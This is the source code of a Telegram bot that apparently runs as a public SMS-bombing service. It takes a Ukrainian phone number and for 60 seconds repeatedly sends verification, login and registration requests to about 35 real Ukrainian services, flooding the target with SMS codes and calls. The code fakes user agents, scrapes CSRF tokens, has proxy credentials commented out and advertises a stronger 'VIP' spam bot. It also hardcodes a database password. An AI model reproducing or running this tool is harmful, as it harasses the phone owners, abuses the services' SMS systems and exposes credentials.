from aiogram import *
import fake_useragent
import asyncio
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from markups import checkSubMenu
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.exceptions import BotBlocked
from aiohttp import BasicAuth
from headers_main import headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro, headers_uvape, cookies_uvape, headers_terravape, cookies_terravape, headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota, headers_avtoria, cookies_avtoria
import asyncpg
import config
import aiohttp
import random
import string
import re
from bs4 import BeautifulSoup 

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = [840987868, 6473493435]
channel_id = "-1002329551275"
message = ("Приветствую.\nВы в главном меню.")

db_config = {
    'user': 'postgres',
    'password': 'NMqPGNsFjpkGgrSquFdaizIvAWhyMYer',
    'database': 'railway',
    'host': 'postgres.railway.internal',
    'port': '5432',
}



conn = None

attack_flags = {}

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)

async def init_db():
    global conn
    conn = await asyncpg.connect(**db_config)
    await conn.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            name TEXT,
            username TEXT,
            block INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS blacklist (
            phone_number TEXT PRIMARY KEY
        );
    ''')

async def email(): #email
    name_length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    generated_email = f"{name}@gmail.com"
    logging.info(f"email: {generated_email}")
    return generated_email

async def get_csrf_token(url, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")

            csrf_token = soup.find("input", {"name": "_csrf"})
            if csrf_token:
                return csrf_token.get("value")
            
            meta_token = soup.find("meta", {"name": "csrf-token"})
            if meta_token:
                return meta_token.get("content")
            
            raise ValueError("CSRF-токен не найден.")

def get_cancel_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🚫 Остановить атаку", callback_data="cancel_attack"))
    return keyboard

async def check_subscription_status(user_id):
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        if member.status in {"member", "administrator", "creator"}:
            return True
    except Exception as e:
        logging.error(f"Ошибка: {e}")
    return False

async def anti_flood(*args, **kwargs):
    m = args[0]
    await m.answer("Хватит спамить!")

profile_button = types.KeyboardButton('📱Начать атаку')
referal_button = types.KeyboardButton('Помощь 💻')
money_button = types.KeyboardButton('Поддержать проект 💰')
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(money_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("Отправить сообщение пользователям")
admin_keyboard.add("Добавить номер в черный список")
admin_keyboard.add("Статистика бота")
admin_keyboard.add("Заблокировать пользователя")
admin_keyboard.add("Разблокировать пользователя")
admin_keyboard.add("Назад")

class Dialog(StatesGroup):
    spam = State()
    block_user = State()
    unblock_user = State()

async def add_user(user_id: int, name: str, username: str):
    await conn.execute(
        'INSERT INTO users (user_id, name, username, block) VALUES ($1, $2, $3, $4) ON CONFLICT (user_id) DO NOTHING',
        user_id, name, username, 0
    )
    profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
    for admin_id in ADMIN:
        try:
            await bot.send_message(admin_id, f"Новый пользователь зарегистрировался в боте:\nИмя: {profile_link}", parse_mode='HTML')
        except Exception as e:
            logging.error(f"Ошибка при отправке админу {admin_id}: {e}")


async def startuser(message:types.Message):
    user_id = message.from_user.id
    if await check_subscription_status(user_id):
        await message.answer(message, reply_markup=profile_keyboard)
    else:
        await message.answer("Вы не подписаны", reply_markup=checkSubMenu)

@dp.message_handler(commands=['start'])
async def start(message: Message):
    user_id = message.from_user.id
    result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)

    if message.from_user.id in ADMIN:
        await message.answer('Введите команду /admin', reply_markup=profile_keyboard)
    else:
        if result is None:
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username)
        
        if result and result['block'] == 1:
            await message.answer("Вы заблокированы и не можете использовать бота.")
            return
        
        if not await check_subscription_status(user_id):
            await message.answer("Ты не подписан на наш канал!", reply_markup=checkSubMenu)
            return
        
        await bot.send_message(user_id, f"Приветствую, {message.from_user.first_name}\nВы в главном меню.", reply_markup=profile_keyboard)

@dp.callback_query_handler(text="subchanneldone")
async def process_subscription_confirmation(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if await check_subscription_status(user_id):
        await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await callback_query.answer("")
        await bot.send_message(user_id, message, reply_markup=profile_keyboard)
        await bot.delete_message(callback_query.message.chat.id, callback_query.message.message_id)
    else:
        await callback_query.answer("Ты до сих пор не подписан на канал...")

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(f'{message.from_user.first_name}, выберите действие👇', reply_markup=admin_keyboard)
    else:
        await message.answer('Вы не являетесь админом.')

@dp.message_handler(text="Статистика бота")
async def bot_stats(message: Message):
    if message.from_user.id in ADMIN:
        users = await conn.fetch('SELECT user_id FROM users')
        user_count = len(users)
        if user_count > 0:
            text = f'<b>👷‍♂️Количество пользователей:</b> {user_count}'
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer('В боте нет зарегистрированных пользователей.')
    else:
        await message.answer("Недостаточно прав.")

@dp.message_handler(text='Отправить сообщение пользователям')
async def broadcast_prompt(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.spam.set()
        await message.answer('Введите сообщение для пользователей:')

@dp.message_handler(state=Dialog.spam, content_types=[types.ContentType.TEXT, types.ContentType.PHOTO, types.ContentType.VIDEO, types.ContentType.DOCUMENT])
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text if message.text else ""
    content_type = "text" if message.text else "unknown"

    if message.photo:
        content_type = "photo"
        photo_id = message.photo[-1].file_id
    elif message.video:
        content_type = "video"
        video_id = message.video.file_id
    elif message.document:
        content_type = "document"
        document_id = message.document.file_id

    users = await conn.fetch('SELECT user_id FROM users')

    for user in users:
        user_id = user['user_id']
        try:
            if content_type == "text":
                await bot.send_message(user_id, text)
            elif content_type == "photo":
                await bot.send_photo(user_id, photo_id, caption=text)
            elif content_type == "video":
                await bot.send_video(user_id, video_id, caption=text)
            elif content_type == "document":
                await bot.send_document(user_id, document_id, caption=text)
        except BotBlocked:
            logging.error(f"Бот заблокирован пользователем {user_id}. Пропускаем его.")

    await message.answer('Сообщение отправлено!')
    await state.finish()

@dp.message_handler(commands=['block'])
async def add_to_blacklist(message: Message):
    args = message.get_args()
    
    if not args:
        await message.answer("Пожалуйста, введите номер телефона для добавления в черный список.\nПример: /block 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("Номер должен быть формата: 380ХХХХХХХХХ. Пожалуйста, введите номер повторно.")
        return

    try:
        await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"Номер {phone} добавлен в черный список.")
    except Exception as e:
        await message.answer("Произошла ошибка при добавлении номера в черный список.")
        print(f"Ошибка: {e}")


@dp.message_handler(text="Заблокировать пользователя")
async def block_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("Введите ID пользователя для блокировки:")
        await Dialog.block_user.set()

@dp.message_handler(state=Dialog.block_user)
async def process_block(message: Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 1, user_id)
        await message.answer(f"Пользователь с ID {user_id} заблокирован.")
    else:
        await message.answer("Некорректный ID пользователя. Пожалуйста, введите числовой ID.")
    await state.finish()

@dp.message_handler(text="Разблокировать пользователя")
async def unblock_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("Введите ID пользователя для разблокировки:")
        await Dialog.unblock_user.set()

@dp.message_handler(state=Dialog.unblock_user)
async def process_unblock(message: Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await message.answer(f"Пользователь с ID {user_id} разблокирован.")
    else:
        await message.answer("Некорректный ID пользователя. Пожалуйста, введите числовой ID.")
    await state.finish()

@dp.message_handler(text="Назад")
async def back_to_admin_menu(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer('Введите номер телефона.\nПример:\n<i>🇺🇦380xxxxxxxxx</i>', parse_mode="html", reply_markup=profile_keyboard)
    else:
        await message.answer('Вы не являетесь админом.')

@dp.message_handler(text='Поддержать проект 💰')
async def money_help(message: types.Message):
    user_id = message.from_user.id
    result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вы заблокированы и не можете использовать бота.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Вы отписались от канала. Подпишитесь, чтобы продолжить использование бота.", reply_markup=checkSubMenu)
        return

    await bot.send_message(message.chat.id, "Вы можете поддержать наш проект, отправив любую сумму на карту:\n\n<code>4441 1110 3508 5566</code>\n\nСпасибо ❤️‍🩹", parse_mode="HTML")

@dp.message_handler(text='Помощь 💻')
@dp.throttled(anti_flood, rate=3)
async def help(message: types.Message):
    user_id = message.from_user.id
    result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вы заблокированы и не можете использовать бота.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("Вы отписались от канала. Подпишитесь, чтобы продолжить использование бота.", reply_markup=checkSubMenu)
        return
    
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='Чатик 💬', url='https://t.me/+_Oa70LoUuWE1NmRi')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "Вы можете задать любой интересующий вопрос в [чате](https://t.me/+_Oa70LoUuWE1NmRi) 😉", disable_web_page_preview=True, parse_mode="MarkdownV2", reply_markup=inline_keyboard)

@dp.message_handler(text='📱Начать атаку')
async def start_attack_prompt(message: Message):
    user_id = message.from_user.id
    result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вы заблокированы и не можете использовать бота.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Вы отписались от канала. Подпишитесь, чтобы продолжить использование бота.", reply_markup=checkSubMenu)
        return
    
    await message.answer('Введите номер телефона.\nПример:\n<i>🇺🇦380xxxxxxxxx</i>', parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST', cookies=None, proxy=None, proxy_auth=None):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number):
    headers = {"User-Agent": fake_useragent.UserAgent().random}
    # proxy = "http://91.124.109.175:59100"
    # proxy_auth = BasicAuth("finake777", "R326EZkznb")

    proxy = None
    proxy_auth = None

    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except ValueError as e:
        logging.error(f"Не удалось получить CSRF-токен: {e}")
        return

    logging.info(f"Получен CSRF-токен: {csrf_token}")

    formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
    formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
    formatted_number3 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:]}"
    formatted_number4 = f"+{number[:2]}({number[2:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
    raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"


    logging.info(f"Запуск атаки на номер {number}")

    async def send_request_and_log(url, **kwargs):
        try:
            response = await send_request(url, **kwargs)
            if response.status == 200:
                logging.info(f"Успех - {number}")
        except Exception as e:
            logging.error(f"{e}")

    tasks = [
        send_request_and_log("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://api.pizzaday.ua/api/V1/user/sendCode", json={"applicationSend": "sms", "lang": "uk", "phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://stationpizza.com.ua/api/v1/auth/phone-auth", json={"needSubscribeForNews": "false", "phone": formatted_number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", json={"phone": formatted_number, "type": ""}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://pizza-time.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://iq-pizza.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://dnipro-m.ua/ru/phone-verification/", json={"phone": number}, headers=headers_dnipro, cookies=cookies_dnipro, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://my.ctrs.com.ua/api/v2/signup", json={"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://my.ctrs.com.ua/api/auth/login", json={"identity": "+" + number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://auth.easypay.ua/api/check", json={"phone": number}, headers=headers_easypay, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://sandalini.ua/ru/signup/", data={"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://uvape.pro/index.php?route=account/register/add", data={"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, headers=headers_uvape, cookies=cookies_uvape, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4, "only_sms": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", data={"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, headers=headers_terravape,cookies=cookies_terravape, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://im.comfy.ua/api/auth/v3/otp/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://im.comfy.ua/api/auth/v3/ivr/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://www.moyo.ua/identity/registration", data={"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, headers=headers_moyo, cookies=cookies_moyo, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://pizza.od.ua/ajax/reg.php", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://sushiya.ua/ru/api/v1/user/auth", data={"phone": number[2:], "need_skeep": ""}, headers=headers_sushiya, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://avrora.ua/index.php?dispatch=otp.send", data={"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://zolotakraina.ua/ua/turbosms/verification/code", data={"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, headers=headers_zolota,cookies=cookies_zolota, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://auto.ria.com/iframe-ria-login/registration/2/4", data={"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, headers=headers_avtoria, cookies=cookies_avtoria, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log(f"https://ukrpas.ua/login?phone=+{number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://maslotom.com/api/index.php?route=api/account/phoneLogin", data={"phone": formatted_number6}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", data={"telephone": formatted_number7}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://api.iqos.com.ua/v1/auth/otp", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log(f"https://llty-api.lvivkholod.com/api/client/{number}", method='POST', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://api-mobile.planetakino.ua/graphql", json={"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://back.trofim.com.ua/api/via-phone-number", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log("https://dracula.robota.ua/?q=SendOtpCode", json={"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
        send_request_and_log(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
    ]

    await asyncio.gather(*tasks)

async def start_attack(number, chat_id):
    global attack_flags
    attack_flags[chat_id] = True
    
    timeout = 60
    start_time = asyncio.get_event_loop().time()

    try:
        while (asyncio.get_event_loop().time() - start_time) < timeout:
            if not attack_flags.get(chat_id):
                logging.info(f"Атака на номер {number} остановлена.")
                await bot.send_message(chat_id, "🛑 Атака остановлена.")
                return
            await ukr(number)
    except asyncio.CancelledError:
        await bot.send_message(chat_id, "🛑 Атака остановлена.")

    logging.info(f"Атака на номер {number} завершена через 60 секунд")
    inline_keyboard2 = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='Чатик 💬', url='https://t.me/+_Oa70LoUuWE1NmRi')
    inline_keyboard2 = inline_keyboard2.add(code_sub)
    await bot.send_message(chat_id=chat_id, text=f"Атака на номер <i>{number}</i> завершена!\n\nУ нас есть VIP-бот, который спамит в 10 раз лучше!\nДля оформления + в чатик ⬇️", parse_mode="html", reply_markup=inline_keyboard2)


@dp.message_handler(content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message):
    user_id = message.from_user.id
    result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if not result:
        await message.answer("Ошибка: Не удалось найти пользователя.")
        return

    if result['block'] == 1:
        await message.answer("Вы заблокированы и не можете использовать бота.")
        return

    number = message.text.strip()
    chat_id = message.chat.id
    
    number = re.sub(r'\D', '', number)
    if number.startswith('0'):
        number = '380' + number[1:]

    if len(number) == 12 and number.startswith('380'):
        is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
        if is_blacklisted:
            await message.answer(f"Номер <i>{number}</i> защищен от атаки.", parse_mode="html")
            return

        cancel_keyboard = get_cancel_keyboard()
        attack_flags[chat_id] = True 
        await message.answer(f'🇺🇦 Атака началась на номер <i>{number}</i>', parse_mode="html", reply_markup=get_cancel_keyboard())

        asyncio.create_task(start_attack(number, chat_id))
    else:
        await message.answer("Неверный формат номера.\nВведите номер повторно.\nПример: <i>🇺🇦380XXXXXXXXX</i>", parse_mode="html")

@dp.callback_query_handler(lambda c: c.data == "cancel_attack")
async def cancel_attack(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    attack_flags[chat_id] = False
    await callback_query.answer("Останавливаем...")

if __name__ == '__main__':
    logging.info("Запуск бота...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    executor.start_polling(dp, skip_updates=True)
